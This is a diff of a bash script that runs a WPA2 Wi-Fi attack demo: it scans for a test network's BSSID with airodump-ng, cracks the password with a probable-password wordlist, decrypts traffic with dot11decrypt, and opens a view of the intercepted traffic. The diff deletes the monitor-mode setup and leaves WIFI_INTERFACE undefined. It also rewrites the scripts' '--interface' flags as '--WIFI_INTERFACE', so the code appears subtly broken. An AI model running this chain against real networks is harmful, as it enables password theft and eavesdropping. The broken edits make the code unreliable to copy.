@@ -1,22 +1,12 @@
 #!/bin/bash
 
-# Kill interfering processes
-sudo airmon-ng check kill
-
-# Start monitor mode
-sudo airmon-ng start wlp0s20u3
-
-# Set channel to 6
-sudo iw dev wlp0s20u3 set channel 6
-
-INTERFACE="wlp0s20u3"
 WIFI_SSID="WPA2_Test_WiFi"
 WIFI_PASSWORD="000999888"
 
 sudo rm -f scan_results* handshake_demo*
 
 echo "[*] Searching for $WIFI_SSID..."
-sudo timeout 5s airodump-ng --essid "$WIFI_SSID" -w scan_results --output-format csv $INTERFACE > /dev/null 2>&1
+sudo timeout 5s airodump-ng --essid "$WIFI_SSID" -w scan_results --output-format csv $WIFI_INTERFACE > /dev/null 2>&1
 
 WIFI_BSSID=$(grep -m 1 "$WIFI_SSID" scan_results-01.csv | cut -d, -f1)
 
@@ -30,21 +20,21 @@ fi
 
 echo -e "\033[92m[+] Found BSSID: $WIFI_BSSID\033[0m"
 
-# Decryptor interface
-echo -e "\033[92m[+] Starting dot11decrypt on $INTERFACE...\033[0m"
-sudo ./d11decrypt $INTERFACE wpa:$WIFI_SSID:$WIFI_PASSWORD &
+# Decryptor WIFI_INTERFACE
+echo -e "\033[92m[+] Starting dot11decrypt on $WIFI_INTERFACE...\033[0m"
+sudo ./d11decrypt $WIFI_INTERFACE wpa:$WIFI_SSID:$WIFI_PASSWORD &
 DECRYPT_PID=$!
 
 echo -e "\033[92m[+] dot11decrypt running with PID $DECRYPT_PID\033[0m"
 
 # Start wifi password crack demo
 WORDLIST="Top204Thousand-WPA-probable-v2.txt"
-python crack_pass.py --interface $INTERFACE --bssid $WIFI_BSSID --channel 6 --wordlist $WORDLIST
+python crack_pass.py --WIFI_INTERFACE $WIFI_INTERFACE --bssid $WIFI_BSSID --channel 6 --wordlist $WORDLIST
 
 read -p "Press Enter to start traffic view..."
 
 # Start intercepted traffic view
-sudo python3 ../open_wifi/main.py --interface tap0
+sudo python3 ../open_wifi/main.py --WIFI_INTERFACE tap0
 
 # input and shutdown for now
 read -p "Press Enter to exit..."
